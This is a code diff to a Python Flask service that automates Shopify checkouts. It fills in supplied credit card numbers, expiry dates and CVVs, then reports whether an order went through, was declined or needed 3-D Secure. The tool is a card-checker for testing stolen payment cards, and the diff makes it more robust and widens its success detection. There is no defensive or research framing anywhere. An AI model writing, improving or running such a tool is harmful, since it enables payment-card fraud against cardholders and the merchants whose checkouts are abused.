@@ -18,22 +18,24 @@ def extract_cc(text):
 
 async def check_shopify(site, card, month, year, cvv):
     async with async_playwright() as p:
-        browser = await p.chromium.launch(headless=True)
-        context = await browser.new_context()
-        page = await context.new_page()
+        browser = await p.chromium.launch(
+            headless=True,
+            args=['--no-sandbox', '--disable-setuid-sandbox']
+        )
+        page = await browser.new_page()
         try:
-            await page.goto(site, timeout=15000)
-            await page.goto(f"{site}/checkout", timeout=30000)
-            # Fill card details (simplified selectors)
+            await page.goto(site, timeout=15000, wait_until='domcontentloaded')
+            await page.goto(f"{site}/checkout", timeout=30000, wait_until='networkidle')
             await page.fill('input[name="checkout[credit_card][number]"]', card)
             await page.fill('input[name="checkout[credit_card][month]"]', month)
             await page.fill('input[name="checkout[credit_card][year]"]', year)
             await page.fill('input[name="checkout[credit_card][verification_value]"]', cvv)
             await page.click('button[type="submit"]')
             await page.wait_for_timeout(5000)
-            if "thank_you" in page.url.lower():
+            content = await page.content()
+            if "thank_you" in page.url.lower() or "order" in page.url.lower():
                 return {"Response": "Order placed", "Price": 0, "Gateway": "Shopify"}
-            elif "3d" in (await page.content()).lower():
+            elif "3d" in content.lower() or "authenticate" in content.lower():
                 return {"Response": "3DS_REQUIRED", "Price": 0, "Gateway": "Shopify"}
             else:
                 return {"Response": "Declined", "Price": 0, "Gateway": "Shopify"}
@@ -43,7 +45,7 @@ async def check_shopify(site, card, month, year, cvv):
             await browser.close()
 
 @app.route('/shopify', methods=['GET'])
-def shopify():
+def shopify_check():
     site = request.args.get('site')
     cc = request.args.get('cc')
     if not site or not cc:
@@ -53,10 +55,7 @@ def shopify():
         return jsonify({"Response": "Invalid cc", "Price": 0, "Gateway": "Shopify"}), 400
     if not site.startswith('http'):
         site = 'https://' + site
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    result = loop.run_until_complete(check_shopify(site, card, month, year, cvv))
-    loop.close()
+    result = asyncio.run(check_shopify(site, card, month, year, cvv))
     return jsonify(result)
 
 @app.route('/health')
@@ -65,4 +64,4 @@ def health():
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 8080))
-    app.run(host='0.0.0.0', port=port, debug=False)
+    app.run(host='0.0.0.0', port=port)
